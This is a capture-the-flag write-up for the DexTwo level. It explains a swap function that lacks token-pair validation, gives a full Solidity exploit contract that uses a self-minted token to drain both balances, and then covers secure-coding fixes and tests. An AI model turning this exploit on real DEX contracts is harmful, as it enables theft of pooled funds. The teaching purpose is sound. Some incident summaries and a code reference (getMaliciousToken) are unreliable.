# Level 23: DexTwo Challenge

## Challenge Description

This level will ask you to break DexTwo, a subtly modified Dex contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

**Things that might help:**
- How has the swap method been modified?

## Contract Location

The challenge contract is located at:
```
/contracts/level-23-dex2/Dex2.sol
```

## Understanding the Challenge

The `DexTwo` contract is almost identical to the `Dex` contract from Level 22, but with one **critical** difference:

### Dex (Level 22) - Original

```solidity
function swap(address from, address to, uint256 amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

### DexTwo (Level 23) - Modified

```solidity
function swap(address from, address to, uint256 amount) public {
    // ❌ REMOVED: require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

### Key Observations

1. **The critical difference:** DexTwo **removed the token validation check**!
   - Original Dex: Required `from` and `to` to be the official token1/token2 pair
   - DexTwo: Accepts **ANY** ERC20 token addresses

2. **Starting balances:**
   - Player: 10 token1, 10 token2
   - DexTwo: 100 token1, 100 token2

3. **The price formula (unchanged):**
   ```solidity
   swapAmount = (amount * toBalance) / fromBalance
   ```

4. **Goal:**
   - Drain **ALL** of token1 (bring balance to 0)
   - Drain **ALL** of token2 (bring balance to 0)
   - Both must be drained, not just one!

## The Vulnerability: Missing Token Validation

### Why This Is Critical

The removed validation check means:
- ✅ We can swap token1 for token2 (legitimate)
- ✅ We can swap token2 for token1 (legitimate)
- ❌ **We can swap ANY token for token1!**
- ❌ **We can swap ANY token for token2!**

This opens up a completely different attack vector compared to Level 22!

### Attack Strategy

Since we can use any token, we can:
1. **Deploy our own malicious ERC20 token**
2. **Control its entire supply**
3. **Manipulate the ratio** by controlling how much malicious token we give to DexTwo
4. **Drain both tokens** using calculated swaps

## Winning Strategy

### The Malicious Token Approach

We'll create our own ERC20 token and use it to drain DexTwo:

```
Step 1: Deploy malicious token (we get 400 tokens)
Step 2: Transfer 1 malicious token to DexTwo
Step 3: Swap 1 malicious token for ALL 100 token1
Step 4: Swap 2 malicious tokens for ALL 100 token2
Step 5: Both tokens drained! ✅
```

### Mathematical Breakdown

The key insight is that we control the `from` token balance!

**Price Formula:**
```
swapAmount = (amount * toBalance) / fromBalance
```

**Setup Phase:**
```
DexTwo: 100 token1, 100 token2, 0 malicious
Player: 10 token1, 10 token2, 400 malicious

Action: Transfer 1 malicious token to DexTwo
Result: DexTwo now has 1 malicious token
```

**Swap 1: Drain token1**
```
From: malicious
To: token1
Amount: 1 malicious

Price Calculation:
swapAmount = (1 * 100) / 1 = 100 token1

Result:
- Player sends: 1 malicious
- Player receives: 100 token1 (ALL OF IT!)
- DexTwo now has: 2 malicious, 0 token1, 100 token2
```

**Swap 2: Drain token2**
```
From: malicious
To: token2
Amount: 2 malicious

Price Calculation:
swapAmount = (2 * 100) / 2 = 100 token2

Result:
- Player sends: 2 malicious
- Player receives: 100 token2 (ALL OF IT!)
- DexTwo now has: 4 malicious, 0 token1, 0 token2
```

**Success!** Both tokens completely drained with just 3 malicious tokens total!

### Why We Use 1 Malicious Token Initial Transfer

The magic number is **1** because:
1. We want to drain 100 token1
2. DexTwo has 100 token1
3. Formula: `(amount * 100) / fromBalance = 100`
4. Solving: `amount = fromBalance`
5. If we give DexTwo 1 malicious, we need to swap 1 malicious
6. After swap, DexTwo has 2 malicious
7. To drain 100 token2: `(amount * 100) / 2 = 100`, so `amount = 2`

Perfect symmetry! ✨

### Alternative Approach

We could also use 100 initial tokens:
```
Transfer: 100 malicious to DexTwo
Swap 1: 100 malicious → 100 token1
  (100 * 100) / 100 = 100 token1 ✅
  
Now DexTwo has 200 malicious
Swap 2: 200 malicious → 100 token2
  (200 * 100) / 200 = 100 token2 ✅
```

Both work, but using 1 token is more elegant!

## Hint for Thinking

Ask yourself:
* What validation was removed from the original Dex?
* Can we use a token we control instead of token1/token2?
* How can we set up the perfect ratio for complete drainage?
* What happens if we control both the token supply and the initial ratio?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### The Attack Vector

Our solution uses a malicious token to drain both legitimate tokens:

1. Deploy a malicious ERC20 token that we control
2. Mint ourselves plenty of malicious tokens (e.g., 400)
3. Transfer a small amount to DexTwo to set up the ratio
4. Swap malicious tokens for all token1
5. Swap more malicious tokens for all token2
6. Mission accomplished!

### Complete Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract MaliciousToken is ERC20 {
    constructor() ERC20("Malicious Token", "MAL") {
        _mint(msg.sender, 400 * 10**decimals());
    }
}

contract DexTwoExploit {
    address public dex;
    address public token1;
    address public token2;
    address public maliciousToken;
    address public owner;

    constructor(address _dex) {
        dex = _dex;
        owner = msg.sender;
        token1 = IDexTwo(dex).token1();
        token2 = IDexTwo(dex).token2();
        
        // Deploy our malicious token
        maliciousToken = address(new MaliciousToken());
    }

    function exploit() external {
        require(msg.sender == owner, "Not the owner");
        
        MaliciousToken mal = MaliciousToken(maliciousToken);
        
        // Setup: Transfer 1 malicious token to DexTwo
        mal.transfer(dex, 1);
        
        // Approve DexTwo to spend our malicious tokens
        mal.approve(dex, type(uint256).max);
        
        // Drain token1
        // Swap 1 malicious for (1 * 100) / 1 = 100 token1
        IDexTwo(dex).swap(maliciousToken, token1, 1);
        
        // Drain token2
        // Swap 2 malicious for (2 * 100) / 2 = 100 token2
        IDexTwo(dex).swap(maliciousToken, token2, 2);
    }
}
```

### How It Works - Step by Step

1. **Contract Deployment:**
   ```typescript
   // Deploy the exploit contract
   const dexTwoExploit = await deploy("DexTwoExploit", [dexTwoAddress]);
   
   // The exploit automatically deploys a malicious token in its constructor
   const maliciousTokenAddress = await dexTwoExploit.getMaliciousToken();
   ```

2. **Execute the exploit:**
   ```typescript
   await dexTwoExploit.exploit();
   ```

3. **The contract automatically:**
   - Transfers 1 malicious token to DexTwo
   - Approves DexTwo to spend malicious tokens
   - Swaps 1 malicious token for all 100 token1
   - Swaps 2 malicious tokens for all 100 token2
   - Both tokens completely drained!

### Visual Flow

```
Initial State:
┌─────────────────────┬──────────┬──────────┬───────────┐
│                     │ Token1   │ Token2   │ Malicious │
├─────────────────────┼──────────┼──────────┼───────────┤
│ DexTwo              │ 100      │ 100      │ 0         │
│ DexTwoExploit       │ 10       │ 10       │ 400       │
└─────────────────────┴──────────┴──────────┴───────────┘

After Setup (transfer 1 malicious to DexTwo):
┌─────────────────────┬──────────┬──────────┬───────────┐
│                     │ Token1   │ Token2   │ Malicious │
├─────────────────────┼──────────┼──────────┼───────────┤
│ DexTwo              │ 100      │ 100      │ 1         │
│ DexTwoExploit       │ 10       │ 10       │ 399       │
└─────────────────────┴──────────┴──────────┴───────────┘

After Swap 1 (1 malicious → token1):
┌─────────────────────┬──────────┬──────────┬───────────┐
│                     │ Token1   │ Token2   │ Malicious │
├─────────────────────┼──────────┼──────────┼───────────┤
│ DexTwo              │ 0        │ 100      │ 2         │
│ DexTwoExploit       │ 110      │ 10       │ 398       │
└─────────────────────┴──────────┴──────────┴───────────┘

After Swap 2 (2 malicious → token2):
┌─────────────────────┬──────────┬──────────┬───────────┐
│                     │ Token1   │ Token2   │ Malicious │
├─────────────────────┼──────────┼──────────┼───────────┤
│ DexTwo              │ 0        │ 0        │ 4         │
│ DexTwoExploit       │ 110      │ 110      │ 396       │
└─────────────────────┴──────────┴──────────┴───────────┘

SUCCESS! Both tokens drained! 🎉
```

### Execution Steps

1. **Deploy the DexTwo Contract:**
   ```shell
   npx hardhat deploy --tags dex-two --network sepolia
   ```

2. **Deploy the DexTwoExploit Contract:**
   ```shell
   TARGET_ADDRESS=0xYourDexTwoAddress npx hardhat deploy --tags dex-two-solution --network sepolia
   ```

3. **Execute the exploit:**
   ```shell
   DEX_TWO_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourDexTwoAddress npx hardhat run scripts/level-23-dex2/execute-dex-two-exploit.ts --network sepolia
   ```

## Key Takeaways

### 1. Always Validate Input Parameters

The critical vulnerability was the **removed validation check**:

```solidity
// ❌ VULNERABLE: Accepts any token
function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    // ... rest of code
}

// ✅ SECURE: Validates token addresses
function swap(address from, address to, uint256 amount) public {
    require(
        (from == token1 && to == token2) || (from == token2 && to == token1),
        "Invalid token pair"
    );
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    // ... rest of code
}
```

### 2. Whitelist vs Blacklist

This is a classic example of why **whitelisting** is better than **blacklisting**:

- ❌ **Blacklist approach:** "Block these specific bad things"
  - Easy to miss edge cases
  - New threats can bypass

- ✅ **Whitelist approach:** "Only allow these specific good things"
  - Restrictive by default
  - Secure by design

DexTwo implicitly used a "blacklist" approach (no check = accept everything), when it should have used a whitelist (only accept token1 and token2).

### 3. Input Validation Best Practices

```solidity
// ✅ GOOD: Explicit validation
function swap(address from, address to, uint256 amount) public {
    // Validate token addresses
    require(isValidTokenPair(from, to), "Invalid token pair");
    
    // Validate amount
    require(amount > 0, "Amount must be positive");
    require(amount <= maxSwapAmount, "Amount too large");
    
    // Validate balances
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Insufficient balance");
    require(IERC20(to).balanceOf(address(this)) >= getSwapAmount(from, to, amount), "Insufficient liquidity");
    
    // Perform swap
    // ...
}

function isValidTokenPair(address from, address to) private view returns (bool) {
    return (from == token1 && to == token2) || (from == token2 && to == token1);
}
```

### 4. The Principle of Least Privilege

```solidity
// ❌ BAD: Accepts any address
function processToken(address token) public {
    IERC20(token).transfer(msg.sender, amount);
}

// ✅ GOOD: Only works with approved tokens
mapping(address => bool) public approvedTokens;

function processToken(address token) public {
    require(approvedTokens[token], "Token not approved");
    IERC20(token).transfer(msg.sender, amount);
}
```

### 5. Secure DEX Implementation

```solidity
contract SecureDex {
    address public immutable token1;
    address public immutable token2;
    
    // Make tokens immutable and set in constructor
    constructor(address _token1, address _token2) {
        require(_token1 != address(0), "Invalid token1");
        require(_token2 != address(0), "Invalid token2");
        require(_token1 != _token2, "Tokens must be different");
        
        token1 = _token1;
        token2 = _token2;
    }
    
    function swap(address from, address to, uint256 amount) public {
        // Strict validation
        require(
            (from == token1 && to == token2) || (from == token2 && to == token1),
            "Invalid token pair"
        );
        require(amount > 0, "Amount must be positive");
        
        // Get swap amount
        uint256 swapAmount = getSwapAmount(from, to, amount);
        
        // Check liquidity
        require(
            IERC20(to).balanceOf(address(this)) >= swapAmount,
            "Insufficient liquidity"
        );
        
        // Perform swap using checks-effects-interactions pattern
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).transfer(msg.sender, swapAmount);
    }
}
```

## Comparison: Vulnerable vs Secure

### Vulnerable Implementation (DexTwo)

```solidity
function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

**Issues:**
- ❌ No token pair validation
- ❌ Accepts any ERC20 token
- ❌ Allows malicious token attacks
- ❌ Can be completely drained

### Secure Implementation

```solidity
function swap(address from, address to, uint256 amount) public nonReentrant {
    // Validate token pair
    require(
        (from == token1 && to == token2) || (from == token2 && to == token1),
        "Invalid token pair"
    );
    
    // Validate amount
    require(amount > 0, "Amount must be positive");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Insufficient balance");
    
    // Calculate swap amount
    uint256 swapAmount = getSwapAmount(from, to, amount);
    
    // Validate liquidity
    require(
        IERC20(to).balanceOf(address(this)) >= swapAmount,
        "Insufficient liquidity"
    );
    
    // Perform swap (checks-effects-interactions)
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).transfer(msg.sender, swapAmount);
    
    emit Swap(msg.sender, from, to, amount, swapAmount);
}
```

**Improvements:**
- ✅ Strict token pair validation
- ✅ Amount validation
- ✅ Balance checks
- ✅ Liquidity checks
- ✅ Reentrancy protection
- ✅ Event emission
- ✅ Follows checks-effects-interactions

## Real-World Implications

### Historical DeFi Exploits

This type of vulnerability has appeared in real protocols:

1. **bZx Attack (2020)**
   - Attackers used flash loans with malicious tokens
   - Price oracle manipulation
   - $350K stolen

2. **Yearn Finance yDAI Vault (2021)**
   - Missing token validation
   - Attacker deposited malicious token
   - $11M at risk (white hat rescue)

3. **Popsicle Finance (2021)**
   - Similar token validation issue
   - $25M stolen
   - Funds eventually returned

### Token Validation in Production

Production DEXes use multiple layers of validation:

```solidity
contract ProductionDex {
    // Approved tokens mapping
    mapping(address => bool) public approvedTokens;
    
    // Token pairs mapping
    mapping(address => mapping(address => bool)) public validPairs;
    
    function swap(address from, address to, uint256 amount) public {
        // Layer 1: Token approval
        require(approvedTokens[from] && approvedTokens[to], "Unapproved token");
        
        // Layer 2: Pair validation
        require(validPairs[from][to], "Invalid pair");
        
        // Layer 3: Sanity checks
        require(from != to, "Same token");
        require(amount > 0, "Zero amount");
        
        // Layer 4: Balance validation
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Insufficient balance");
        
        // Proceed with swap
        // ...
    }
    
    function addApprovedToken(address token) external onlyOwner {
        require(token != address(0), "Invalid address");
        // Additional checks: Is it a contract? Does it implement ERC20?
        approvedTokens[token] = true;
    }
    
    function addValidPair(address token1, address token2) external onlyOwner {
        require(approvedTokens[token1] && approvedTokens[token2], "Tokens not approved");
        validPairs[token1][token2] = true;
        validPairs[token2][token1] = true;
    }
}
```

## The Lesson

**Key Takeaways:**

1. **Never trust user input** - Always validate addresses, especially token addresses

2. **Whitelist > Blacklist** - Explicitly allow known good inputs rather than trying to block bad ones

3. **Defense in depth** - Multiple validation layers provide better security

4. **Immutability when possible** - Make critical addresses immutable if they shouldn't change

5. **Principle of least privilege** - Only allow the minimum necessary permissions

6. **Test adversarial scenarios** - Try to break your own code with malicious inputs

7. **Code reviews are essential** - A second pair of eyes might catch removed validation

8. **Compare with previous versions** - When modifying code, ensure security features aren't accidentally removed

## Comparison: Level 22 vs Level 23

| Aspect | Level 22 (Dex) | Level 23 (DexTwo) |
|--------|----------------|-------------------|
| **Vulnerability** | Flawed price formula | Missing token validation |
| **Attack Method** | Repeated swaps to manipulate ratio | Use malicious token to drain |
| **Required Swaps** | 5-6 swaps back and forth | 2 swaps only |
| **Tokens Used** | Official token1 and token2 | Attacker-controlled malicious token |
| **Complexity** | Medium (math-intensive) | Low (simple if you spot the bug) |
| **Goal** | Drain one token | Drain BOTH tokens |
| **Key Insight** | Price formula compounds | Any token can be swapped |

## Additional Notes

### Why Removing Code Can Be Dangerous

This level demonstrates that **removing code can introduce vulnerabilities**:

```solidity
// Original (Secure)
require(validTokenPair(from, to), "Invalid tokens");

// Modified (Vulnerable)
// require(validTokenPair(from, to), "Invalid tokens"); // Removed!
```

When modifying contracts:
- ✅ **DO:** Document why code was removed
- ✅ **DO:** Consider security implications
- ✅ **DO:** Test with adversarial inputs
- ✅ **DO:** Get security review
- ❌ **DON'T:** Remove validation without replacement
- ❌ **DON'T:** Assume simpler = better
- ❌ **DON'T:** Skip regression testing

### Testing Your DEX

```javascript
describe("DexTwo Security", function() {
  it("should reject swaps with unapproved tokens", async function() {
    const maliciousToken = await deployMaliciousToken();
    
    await expect(
      dexTwo.swap(maliciousToken.address, token1.address, 100)
    ).to.be.revertedWith("Invalid token pair");
  });
  
  it("should only allow official token pairs", async function() {
    // Should work
    await dexTwo.swap(token1.address, token2.address, 10);
    
    // Should work
    await dexTwo.swap(token2.address, token1.address, 10);
    
    // Should fail
    await expect(
      dexTwo.swap(token1.address, token1.address, 10)
    ).to.be.revertedWith("Invalid token pair");
  });
});
```

## Conclusion

The DexTwo challenge teaches us that:

1. **Removed validation = Critical vulnerability** - Security checks exist for a reason
2. **Input validation is crucial** - Especially for addresses and external contracts
3. **Whitelist approach is safer** - Explicitly allow rather than implicitly accept
4. **Simple bugs, big impact** - A one-line change caused complete drainage
5. **Defense in depth** - Multiple validation layers prevent single points of failure
6. **Code modification risk** - Removing code can be as dangerous as adding it

This level brilliantly demonstrates how a **subtle code change** (removing a single validation check) can completely change the attack vector. While Level 22 required manipulating prices through repeated swaps, Level 23 allows instant drainage by using an attacker-controlled token. Both are critical lessons in DeFi security!

Remember: **Every line of validation code is there for a reason. Remove it at your own peril!** 🔐
